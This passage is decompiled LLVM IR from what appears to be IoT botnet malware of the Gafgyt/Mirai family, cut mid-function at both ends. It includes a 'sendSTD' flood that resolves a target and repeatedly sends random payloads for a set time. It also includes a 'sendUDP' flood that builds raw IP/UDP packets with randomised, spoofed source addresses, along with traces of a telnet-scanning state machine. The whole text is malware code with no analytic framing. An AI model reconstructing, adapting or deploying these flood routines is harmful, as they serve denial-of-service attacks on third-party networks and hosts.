dec_label_pc_f248:                                ; preds = %dec_label_pc_e834, %dec_label_pc_e980, %dec_label_pc_ec20, %dec_label_pc_f078, %dec_label_pc_f1ec, %dec_label_pc_e128, %dec_label_pc_e41c, %dec_label_pc_f1c8, %dec_label_pc_f0b4, %dec_label_pc_f028, %dec_label_pc_ef5c, %dec_label_pc_ef34, %dec_label_pc_eea8, %dec_label_pc_edac, %dec_label_pc_ed88, %dec_label_pc_ed28, %dec_label_pc_ec5c, %dec_label_pc_ebf8, %dec_label_pc_ebd0, %dec_label_pc_eb0c, %dec_label_pc_eae8, %dec_label_pc_ea88, %dec_label_pc_e9bc, %dec_label_pc_e958, %dec_label_pc_e930, %dec_label_pc_e870, %dec_label_pc_e810, %dec_label_pc_e77c, %dec_label_pc_e758, %dec_label_pc_e5ac, %dec_label_pc_e588, %dec_label_pc_e3f0, %dec_label_pc_e398, %dec_label_pc_f228
  %v1_f24c = add nuw nsw i32 %storemerge553, 1
  store i32 %v1_f24c, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_f260 = icmp slt i32 %v1_f24c, %arg2
  br i1 %v5_f260, label %dec_label_pc_e0c4, label %dec_label_pc_e0b8

; uselistorder directives
  uselistorder i32 %v1_f24c, { 2, 1, 0 }
  uselistorder i32 %v3_f1a0, { 1, 0 }
  uselistorder i32* %v1_edec, { 1, 0, 2, 3 }
  uselistorder i32 %v3_ed00, { 1, 0 }
  uselistorder i32 %v3_ea60, { 1, 0 }
  uselistorder i32 %v5_e6e8, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_e270, { 1, 0 }
  uselistorder i32 %v2_e1c4, { 0, 3, 2, 1 }
  uselistorder i32 %v2_e1c0, { 1, 0, 2, 3 }
  uselistorder i8* %v2_e198, { 2, 1, 0, 3 }
  uselistorder i32 %v2_e194, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i8 %v2_e148, { 1, 0 }
  uselistorder i32 %v0_e10c, { 1, 0 }
  uselistorder i32* %v1_e0e4, { 1, 0, 2 }
  uselistorder i32 %v2_e0e0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e0dc, { 77, 76, 75, 74, 78, 79, 81, 80, 60, 59, 62, 61, 64, 65, 66, 68, 67, 63, 70, 69, 71, 73, 72, 54, 53, 52, 51, 56, 55, 58, 57, 47, 46, 48, 4, 50, 49, 41, 40, 39, 38, 43, 42, 45, 44, 34, 33, 35, 3, 37, 36, 28, 27, 26, 25, 19, 20, 21, 23, 22, 24, 29, 30, 32, 31, 6, 8, 7, 9, 10, 11, 13, 12, 16, 1, 2, 15, 14, 0, 18, 17, 5 }
  uselistorder i32 %v2_e0d8, { 0, 1, 2, 3, 4, 5, 7, 8, 6 }
  uselistorder i32 %v3_e0d0, { 81, 82, 80, 78, 79, 77, 76, 75, 61, 62, 60, 65, 66, 73, 72, 71, 69, 70, 68, 67, 64, 74, 63, 59, 58, 56, 57, 54, 55, 53, 52, 51, 47, 48, 46, 50, 49, 45, 44, 42, 43, 40, 41, 39, 38, 37, 33, 34, 32, 36, 35, 31, 30, 28, 29, 27, 25, 26, 23, 22, 24, 21, 20, 19, 18, 17, 11, 9, 10, 8, 7, 6, 5, 4, 16, 15, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge553, { 1, 4, 5, 6, 7, 10, 9, 8, 3, 2, 0 }
  uselistorder i32 %v2_e84c, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_e5d4, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v2_e474, { 1, 0 }
  uselistorder i32 %v1_e09c, { 1, 2, 0 }
  uselistorder i32 %v1_e078, { 2, 1, 0 }
  uselistorder i32 %storemerge462, { 1, 0 }
  uselistorder i32 %v2_df98, { 1, 0 }
  uselistorder i32 %v3_df74, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 83, 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 16, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 34, 35, 38, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 53, 50, 51, 54, 55, 56, 52, 109, 107, 108, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 124, 121, 122, 125, 126, 127, 123, 130, 128, 129, 131, 134, 132, 133, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 177, 153, 154, 155, 156, 159, 157, 158, 160, 161, 162, 163, 164, 165, 166, 167, 169, 168, 170, 171, 172, 173, 174, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 175, 84, 85, 86, 99, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 176, 100, 101, 102, 104, 103, 106, 105 }
  uselistorder i32* %r2.global-to-local, { 50, 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 104, 51, 52, 105, 53, 54 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 12, 13, 14, 15, 16, 17, 18, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8*]* @global_var_26198.505 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_1bdc0.503 to i32*), { 1, 0 }
  uselistorder i32 ptrtoint ([8 x i8*]* @global_var_26188.501 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 5, 4, 2, 7, 6, 0, 1, 3, 8, 9 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f248, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_e5e8, { 1, 0 }
  uselistorder label %dec_label_pc_e5ac, { 1, 0 }
  uselistorder label %dec_label_pc_e128, { 1, 0 }
  uselistorder label %dec_label_pc_e0c4, { 1, 0 }
  uselistorder label %dec_label_pc_e0b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dfbc, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f26c = load i32, i32* @fp, align 4
  store i32 %v3_f26c, i32* %stack_var_-16, align 4
  store i32 62068, i32* %stack_var_-4, align 4
  %v13_f26c = ptrtoint i32* %stack_var_-16 to i32
  %v2_f270 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f270, i32* @fp, align 4
  store i32 %arg3, i32* %stack_var_-208, align 4
  %v0_f290 = call i32 @socket()
  %v2_f2a0 = call i32 @__GI_time(i32* null)
  %v1_f2b4 = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 16, i32* @r2, align 4
  %v2_f2d0 = bitcast i32* %stack_var_-52 to i8*
  %v3_f2d0 = call i32 @__GI_memset(i8* %v2_f2d0, i32 0)
  %v1_f2d8 = add i32 %v1_f2b4, 16
  %v2_f2d8 = inttoptr i32 %v1_f2d8 to i32*
  %v3_f2d8 = load i32, i32* %v2_f2d8, align 4
  %v1_f2dc = inttoptr i32 %v3_f2d8 to i32*
  %v2_f2dc = load i32, i32* %v1_f2dc, align 4
  %v2_f2e4 = ptrtoint i32* %stack_var_-48 to i32
  %v1_f2ec = add i32 %v1_f2b4, 12
  %v2_f2ec = inttoptr i32 %v1_f2ec to i32*
  %v3_f2ec = load i32, i32* %v2_f2ec, align 4
  store i32 %v3_f2ec, i32* @r2, align 4
  %v3_f2fc = call i32 @bcopy(i32 %v2_f2dc, i32 %v2_f2e4, i32 %v3_f2ec)
  %v1_f304 = add i32 %v1_f2b4, 8
  %v2_f304 = inttoptr i32 %v1_f304 to i32*
  %v3_f304 = load i32, i32* %v2_f304, align 4
  %v3_f30c = urem i32 %v3_f304, 65536
  store i32 %v3_f30c, i32* %stack_var_-52, align 4
  %v2_f340 = ptrtoint i32* %stack_var_-196 to i32
  %v3_f3bc = bitcast i32* %stack_var_-52 to %sockaddr*
  %v2_f37c = add i32 %v13_f26c, -180
  br label %dec_label_pc_f33c

dec_label_pc_f33c:                                ; preds = %dec_label_pc_f3f8, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_f3fc, %dec_label_pc_f3f8 ]
  store i32 %v2_f340, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1bf90.555 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_f354 = call i32 @memcpy()
  %v0_f358 = call i32 @random()
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_f3f8, label %dec_label_pc_f398

dec_label_pc_f398:                                ; preds = %dec_label_pc_f33c
  %v2_f368 = urem i32 %v0_f358, 36
  %v3_f374 = mul nuw nsw i32 %v2_f368, 4
  %v2_f380 = add i32 %v2_f37c, %v3_f374
  %v1_f384 = inttoptr i32 %v2_f380 to i32*
  %v2_f384 = load i32, i32* %v1_f384, align 4
  %v5_f3a8 = inttoptr i32 %v2_f384 to i32*
  %v6_f3a8 = call i32 @__libc_send(i32 %v0_f290, i32* %v5_f3a8, i32 65, i32 0)
  %v4_f3bc = call i32 @__libc_connect(i32 %v0_f290, %sockaddr* %v3_f3bc, i32 16)
  %v2_f3c4 = call i32 @__GI_time(i32* null)
  %v3_f3d0 = load i32, i32* %stack_var_-208, align 4
  %v2_f3d4 = add i32 %v3_f3d0, %v2_f2a0
  %v5_f3dc = icmp slt i32 %v2_f3c4, %v2_f3d4
  br i1 %v5_f3dc, label %dec_label_pc_f3f0, label %dec_label_pc_f3e0

dec_label_pc_f3e0:                                ; preds = %dec_label_pc_f398
  %v1_f3e4 = call i32 @__libc_close(i32 %v0_f290)
  %v1_f3ec = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_f3f0:                                ; preds = %dec_label_pc_f398
  br label %dec_label_pc_f3f8

dec_label_pc_f3f8:                                ; preds = %dec_label_pc_f33c, %dec_label_pc_f3f0
  %stack_var_-24.0 = phi i32 [ %storemerge3, %dec_label_pc_f33c ], [ 0, %dec_label_pc_f3f0 ]
  %v1_f3fc = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_f33c

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_f2ec, { 1, 0 }
  uselistorder i32 %v1_f2b4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32 65, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_f3f8, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_f410 = load i32, i32* @r4, align 4
  %v6_f410 = load i32, i32* @fp, align 4
  store i32 62488, i32* %stack_var_-4, align 4
  %v2_f414 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f414, i32* @fp, align 4
  %v2_f418 = ptrtoint i32* %stack_var_-144 to i32
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_f440 = icmp eq i32 %arg2, 0
  br i1 %v2_f440, label %dec_label_pc_f448, label %dec_label_pc_f468

dec_label_pc_f448:                                ; preds = %entry
  %v0_f448 = call i32 @rand_cmwc()
  %v3_f450 = mul i32 %v0_f448, 65536
  store i32 %v3_f450, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f48c

dec_label_pc_f468:                                ; preds = %entry
  %v3_f470 = urem i32 %arg2, 65536
  store i32 %v3_f470, i32* %r3.global-to-local, align 4
  %v1_f478 = call i32 @htons(i32 %v3_f470)
  br label %dec_label_pc_f48c

dec_label_pc_f48c:                                ; preds = %dec_label_pc_f448, %dec_label_pc_f468
  %v2_f490 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_f490, i32* %r3.global-to-local, align 4
  %v3_f49c = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  store i32 %v3_f49c, i32* %r3.global-to-local, align 4
  %v2_f4a4 = icmp eq i32 %v3_f49c, 0
  br i1 %v2_f4a4, label %dec_label_pc_f4ac, label %dec_label_pc_fb00

dec_label_pc_f4ac:                                ; preds = %dec_label_pc_f48c
  %v2_f4ac = ptrtoint i32* %stack_var_-76 to i32
  %v2_f4b0 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_f4b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-68, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v7_f4d0 = icmp eq i32 %arg4, 32
  br i1 %v7_f4d0, label %dec_label_pc_f4d8, label %dec_label_pc_f66c

dec_label_pc_f4d8:                                ; preds = %dec_label_pc_f4ac
  store i32 17, i32* @r2, align 4
  %v0_f4e4 = call i32 @socket()
  store i32 %v0_f4e4, i32* %r3.global-to-local, align 4
  %v2_f4f4 = icmp eq i32 %v0_f4e4, 0
  br i1 %v2_f4f4, label %dec_label_pc_f4fc, label %dec_label_pc_f514

dec_label_pc_f4fc:                                ; preds = %dec_label_pc_f4d8
  %v2_f500 = load i32, i32* @global_var_265cc.54, align 4
  store i32 %v2_f500, i32* %r3.global-to-local, align 4
  %v3_f50c = call i32 @sockprintf(i32 %v2_f500, i32 ptrtoint ([27 x i8]* @global_var_1c020.558 to i32))
  br label %dec_label_pc_fb00

dec_label_pc_f514:                                ; preds = %dec_label_pc_f4d8
  %v3_f514 = load i32, i32* %stack_var_0, align 4
  %v1_f518 = add i32 %v3_f514, 1
  store i32 %v1_f518, i32* %r3.global-to-local, align 4
  %v1_f520 = call i32 @malloc(i32 %v1_f518)
  store i32 %v1_f520, i32* %r3.global-to-local, align 4
  %v2_f530 = icmp eq i32 %v1_f520, 0
  br i1 %v2_f530, label %dec_label_pc_fb00, label %dec_label_pc_f538

dec_label_pc_f538:                                ; preds = %dec_label_pc_f514
  %v3_f538 = load i32, i32* %stack_var_0, align 4
  %v1_f53c = add i32 %v3_f538, 1
  store i32 %v1_f53c, i32* @r2, align 4
  store i32 %v1_f520, i32* %r3.global-to-local, align 4
  %v2_f550 = inttoptr i32 %v1_f520 to i8*
  %v3_f550 = call i32 @__GI_memset(i8* %v2_f550, i32 0)
  %v2_f55c = call i32 @makeRandomStr(i32 %v1_f520, i32 %v3_f538)
  %v2_f564 = call i32 @__GI_time(i32* null)
  %v2_f570 = add i32 %v2_f564, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_f5b0 = inttoptr i32 %v1_f520 to i32*
  %v3_f634 = mul i32 %arg8, 4
  %v3_f644 = mul i32 %arg8, 1000
  br label %dec_label_pc_f58c.outer

dec_label_pc_f58c.outer:                          ; preds = %dec_label_pc_f65c, %dec_label_pc_f62c, %dec_label_pc_f538
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_f538 ], [ %v1_f660, %dec_label_pc_f65c ], [ 0, %dec_label_pc_f62c ]
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_f538 ], [ %v1_f614, %dec_label_pc_f65c ], [ %v1_f614, %dec_label_pc_f62c ]
  br label %dec_label_pc_f58c

dec_label_pc_f58c:                                ; preds = %dec_label_pc_f58c.outer, %dec_label_pc_f604
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_f604 ], [ %stack_var_-112.0.ph, %dec_label_pc_f58c.outer ]
  %v3_f58c = load i32, i32* %stack_var_0, align 4
  store i32 %v2_f4ac, i32* %stack_var_-144, align 4
  store i32 %v3_f58c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_f5b0 = call i32 @__libc_sendto(i32 %v0_f4e4, i32* %v6_f5b0, i32 %v3_f58c, i32 0, i32 %v2_f4ac, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_f5bc = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_f5bc, label %dec_label_pc_f5c4, label %dec_label_pc_f610

dec_label_pc_f5c4:                                ; preds = %dec_label_pc_f58c
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_f440, label %dec_label_pc_f5d0, label %dec_label_pc_f5ec

dec_label_pc_f5d0:                                ; preds = %dec_label_pc_f5c4
  %v0_f5d0 = call i32 @rand_cmwc()
  %v3_f5dc = udiv i32 %v0_f5d0, 256
  %v3_f5e45 = urem i32 %v3_f5dc, 256
  store i32 %v3_f5e45, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f5ec

dec_label_pc_f5ec:                                ; preds = %dec_label_pc_f5c4, %dec_label_pc_f5d0
  %v2_f5f0 = call i32 @__GI_time(i32* null)
  store i32 %v2_f5f0, i32* %r2.global-to-local, align 4
  store i32 %v2_f570, i32* %r3.global-to-local, align 4
  %v8_f600 = icmp sgt i32 %v2_f5f0, %v2_f570
  br i1 %v8_f600, label %dec_label_pc_fb00, label %dec_label_pc_f604

dec_label_pc_f604:                                ; preds = %dec_label_pc_f5ec
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f58c

dec_label_pc_f610:                                ; preds = %dec_label_pc_f58c
  %v1_f614 = add i32 %stack_var_-112.0, 1
  store i32 %arg7, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_f624 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_f624, label %dec_label_pc_f62c, label %dec_label_pc_f65c

dec_label_pc_f62c:                                ; preds = %dec_label_pc_f610
  store i32 %v3_f634, i32* %r2.global-to-local, align 4
  store i32 %v3_f644, i32* %r3.global-to-local, align 4
  %v1_f64c = call i32 @usleep(i32 %v3_f644)
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f58c.outer

dec_label_pc_f65c:                                ; preds = %dec_label_pc_f610
  %v1_f660 = add i32 %stack_var_-108.0.ph, 1
  br label %dec_label_pc_f58c.outer

dec_label_pc_f66c:                                ; preds = %dec_label_pc_f4ac
  store i32 %v2_f418, i32* %r3.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v0_f680 = call i32 @socket()
  store i32 %v0_f680, i32* %r3.global-to-local, align 4
  %v2_f690 = icmp eq i32 %v0_f680, 0
  br i1 %v2_f690, label %dec_label_pc_f698, label %dec_label_pc_f6b0

dec_label_pc_f698:                                ; preds = %dec_label_pc_f66c
  %v2_f69c = load i32, i32* @global_var_265cc.54, align 4
  store i32 %v2_f69c, i32* %r3.global-to-local, align 4
  %v3_f6a8 = call i32 @sockprintf(i32 %v2_f69c, i32 ptrtoint ([27 x i8]* @global_var_1c020.558 to i32))
  br label %dec_label_pc_fafc

dec_label_pc_f6b0:                                ; preds = %dec_label_pc_f66c
  store i32 1, i32* %stack_var_-80, align 4
  %v2_f6b8 = ptrtoint i32* %stack_var_-80 to i32
  store i32 4, i32* %stack_var_-144, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_f6b8, i32* %r3.global-to-local, align 4
  %v6_f6d4 = call i32 @__GI_setsockopt(i32 %v0_f680, i32 0, i32 3, i32* nonnull %stack_var_-80, i32 4)
  store i32 %v6_f6d4, i32* %r3.global-to-local, align 4
  %v1_f6dc = icmp slt i32 %v6_f6d4, 0
  br i1 %v1_f6dc, label %dec_label_pc_f6e4, label %dec_label_pc_f6fc

dec_label_pc_f6e4:                                ; preds = %dec_label_pc_f6b0
  %v2_f6e8 = load i32, i32* @global_var_265cc.54, align 4
  store i32 %v2_f6e8, i32* %r3.global-to-local, align 4
  %v3_f6f4 = call i32 @sockprintf(i32 %v2_f6e8, i32 ptrtoint ([33 x i8]* @global_var_1c03c.560 to i32))
  br label %dec_label_pc_fafc

dec_label_pc_f6fc:                                ; preds = %dec_label_pc_f6b0
  store i32 49, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f708

dec_label_pc_f708:                                ; preds = %dec_label_pc_f6fc, %dec_label_pc_f708
  %v1_f74026 = phi i32 [ 49, %dec_label_pc_f6fc ], [ %v1_f740, %dec_label_pc_f708 ]
  %v2_f70c = call i32 @__GI_time(i32* null)
  store i32 %v2_f70c, i32* %r3.global-to-local, align 4
  store i32 %v2_f70c, i32* @r4, align 4
  %v0_f718 = call i32 @rand_cmwc()
  %v0_f720 = load i32, i32* @r4, align 4
  %v2_f720 = xor i32 %v0_f720, %v0_f718
  store i32 %v2_f720, i32* %r3.global-to-local, align 4
  %v1_f728 = call i32 @srand(i32 %v2_f720)
  %v0_f72c = call i32 @random()
  store i32 %v0_f72c, i32* %r3.global-to-local, align 4
  %v1_f738 = call i32 @init_rand(i32 %v0_f72c)
  %v1_f740 = add nsw i32 %v1_f74026, -1
  store i32 %v1_f740, i32* %r3.global-to-local, align 4
  %v3_f74c = icmp eq i32 %v1_f74026, 0
  br i1 %v3_f74c, label %dec_label_pc_f754, label %dec_label_pc_f708

dec_label_pc_f754:                                ; preds = %dec_label_pc_f708
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_f758 = icmp eq i32 %arg4, 0
  br i1 %v2_f758, label %dec_label_pc_f784, label %dec_label_pc_f76c

dec_label_pc_f76c:                                ; preds = %dec_label_pc_f754
  %v1_f770 = sub i32 32, %arg4
  store i32 %v1_f770, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_f77c = shl i32 -1, %v1_f770
  br label %dec_label_pc_f784

dec_label_pc_f784:                                ; preds = %dec_label_pc_f754, %dec_label_pc_f76c
  %storemerge12 = phi i32 [ %v1_f77c, %dec_label_pc_f76c ], [ 0, %dec_label_pc_f754 ]
  %v3_f784 = load i32, i32* %stack_var_0, align 4
  %v1_f788 = add i32 %v3_f784, 28
  %v1_f798 = add i32 %v3_f784, 34
  %v3_f79c = and i32 %v1_f798, -4
  %v1_f7a4 = load i32, i32* @sp, align 4
  %v2_f7a4 = sub i32 %v1_f7a4, %v3_f79c
  %v1_f7b4 = add i32 %v2_f7a4, 11
  %v3_f7b8 = and i32 %v1_f7b4, -4
  store i32 %v3_f7b8, i32* %r2.global-to-local, align 4
  %v1_f7d8 = add i32 %v3_f7b8, 20
  store i32 %v1_f7d8, i32* %r3.global-to-local, align 4
  %v5_f7dc = inttoptr i32 %v1_f7d8 to i8*
  %v3_f7e0 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_f7e0, i32* @r4, align 4
  %v1_f7e8 = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_f7e8, i32* %r3.global-to-local, align 4
  %v1_f7f4 = call i32 @htonl(i32 %v1_f7e8)
  store i32 %v1_f7f4, i32* %r2.global-to-local, align 4
  %v3_f7fc = load i32, i32* %stack_var_0, align 4
  %v1_f800 = add i32 %v3_f7fc, 8
  %v1_f804 = load i32, i32* @sp, align 4
  %v2_f804 = inttoptr i32 %v1_f804 to i32*
  store i32 %v1_f800, i32* %v2_f804, align 4
  %v0_f80c = load i32, i32* @r4, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_f814 = inttoptr i32 %v3_f7b8 to i8*
  %v5_f814 = call i32 @makeIPPacket(i8* %v4_f814, i32 %v0_f80c, i32 %v1_f7f4, i32 17)
  %v3_f818 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_f818, 8
  %v3_f82c = urem i32 %fold, 65536
  store i32 %v3_f82c, i32* %r3.global-to-local, align 4
  %v1_f834 = call i32 @htons(i32 %v3_f82c)
  %sext = mul i32 %v1_f834, 16777216
  %v1_f838 = sdiv i32 %sext, 16777216
  store i32 %v1_f838, i32* %r3.global-to-local, align 4
  store i32 %v1_f7d8, i32* %r2.global-to-local, align 4
  %v1_f840 = trunc i32 %v1_f838 to i8
  %v3_f840 = add i32 %v3_f7b8, 24
  %v4_f840 = inttoptr i32 %v3_f840 to i8*
  store i8 %v1_f840, i8* %v4_f840, align 4
  %v0_f844 = load i32, i32* %r3.global-to-local, align 4
  %v3_f844 = sdiv i32 %v0_f844, 256
  store i32 %v3_f844, i32* %r3.global-to-local, align 4
  %v1_f848 = trunc i32 %v3_f844 to i8
  %v2_f848 = load i32, i32* %r2.global-to-local, align 4
  %v3_f848 = add i32 %v2_f848, 5
  %v4_f848 = inttoptr i32 %v3_f848 to i8*
  store i8 %v1_f848, i8* %v4_f848, align 1
  %v0_f84c = call i32 @rand_cmwc()
  %v3_f858 = urem i32 %v0_f84c, 65536
  store i32 %v3_f858, i32* %r3.global-to-local, align 4
  store i32 %v1_f7d8, i32* %r2.global-to-local, align 4
  %v1_f860 = trunc i32 %v0_f84c to i8
  store i8 %v1_f860, i8* %v5_f7dc, align 4
  %v0_f864 = load i32, i32* %r3.global-to-local, align 4
  %v3_f86436 = udiv i32 %v0_f864, 256
  %v1_f868 = trunc i32 %v3_f86436 to i8
  %v2_f868 = load i32, i32* %r2.global-to-local, align 4
  %v3_f868 = add i32 %v2_f868, 1
  %v4_f868 = inttoptr i32 %v3_f868 to i8*
  store i8 %v1_f868, i8* %v4_f868, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_f440, label %dec_label_pc_f878, label %dec_label_pc_f890

dec_label_pc_f878:                                ; preds = %dec_label_pc_f784
  %v0_f878 = call i32 @rand_cmwc()
  %v3_f880 = mul i32 %v0_f878, 65536
  store i32 %v3_f880, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_f878 to i8
  br label %dec_label_pc_f8ac

dec_label_pc_f890:                                ; preds = %dec_label_pc_f784
  %v3_f898 = urem i32 %arg2, 65536
  store i32 %v3_f898, i32* %r3.global-to-local, align 4
  %v1_f8a0 = call i32 @htons(i32 %v3_f898)
  %extract.t102 = trunc i32 %v1_f8a0 to i8
  br label %dec_label_pc_f8ac

dec_label_pc_f8ac:                                ; preds = %dec_label_pc_f878, %dec_label_pc_f890
  %v0_f878.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_f878 ], [ %extract.t102, %dec_label_pc_f890 ]
  %v3_f9c4.pre-phi = phi i32 [ 0, %dec_label_pc_f878 ], [ %v3_f898, %dec_label_pc_f890 ]
  store i32 %v1_f7d8, i32* %r2.global-to-local, align 4
  %v4_f8b0 = sext i8 %v0_f878.sink.off0 to i32
  %v3_f8b4 = add i32 %v3_f7b8, 22
  %v4_f8b4 = inttoptr i32 %v3_f8b4 to i8*
  store i8 %v0_f878.sink.off0, i8* %v4_f8b4, align 2
  %v3_f8bc40 = udiv i32 %v4_f8b0, 256
  %v1_f8c0 = trunc i32 %v3_f8bc40 to i8
  %v2_f8c0 = load i32, i32* %r2.global-to-local, align 4
  %v3_f8c0 = add i32 %v2_f8c0, 3
  %v4_f8c0 = inttoptr i32 %v3_f8c0 to i8*
  store i8 %v1_f8c0, i8* %v4_f8c0, align 1
  store i32 %v1_f7d8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_f8cc = add i32 %v3_f7b8, 26
  %v4_f8cc = inttoptr i32 %v3_f8cc to i8*
  store i8 0, i8* %v4_f8cc, align 2
  %v0_f8d0 = load i32, i32* %r3.global-to-local, align 4
